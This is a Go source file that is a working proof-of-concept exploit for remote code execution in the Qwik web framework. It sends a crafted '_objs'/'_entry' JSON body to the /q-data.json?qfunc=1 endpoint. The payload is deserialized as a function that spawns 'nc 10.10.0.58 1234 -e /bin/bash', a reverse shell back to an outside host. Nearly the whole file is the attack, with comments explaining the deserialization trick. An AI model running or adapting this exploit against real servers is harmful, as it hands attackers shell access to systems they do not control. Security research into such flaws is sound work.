package main

import (
"bytes"
"encoding/json"
"fmt"
"net/http"
)

func main() {
fmt.Println("[!] Starting...")

// The host to exploit
host := "http://10.0.160.147:3000"

// The reverse shell payload that will be executed on the server
payload := `(() => {
console.log("[+] Qwik RCE demo with reverse shell.")


process.binding('spawn_sync').spawn({
 file: '/usr/bin/nc',
            args: [
                'nc', '10.10.0.58', '1234', '-e', '/bin/bash'
            ],

stdio: [
{type:'pipe',readable:!0,writable:!1},
{type:'pipe',readable:!1,writable:!0},
{type:'pipe',readable:!1,writable:!0}
]
})
return {}
})()
`

// `_deserializeData` requires an object with two keys, _objs and _entry
// `_objs` contains the elements to be deserialized, the \u0011 prefix indicates to deserialize a PureFunction
// `_entry` references the element in the `_objs` list to return
postBody, _ := json.Marshal(map[string]any{
"_objs":  []string{ "\u0011" + payload },
"_entry": "0",
})

body := bytes.NewBuffer(postBody)

client := http.Client{}

// We need to send via a q-data endpoint, should work even if there are 0 q-data endpoints.
req, err := http.NewRequest("POST", host + "/q-data.json?qfunc=1", body)

if err != nil {
fmt.Println("[!] Error", err)
return
}

req.Header = http.Header{
"X-QRL": {"1"},
"Origin": {host},
"Content-Type": {"application/qwik-json"},
}

resp, err := client.Do(req)

if err != nil {
fmt.Println("[!] Error", err)
return
}

fmt.Println("[!] Done", resp.StatusCode)
}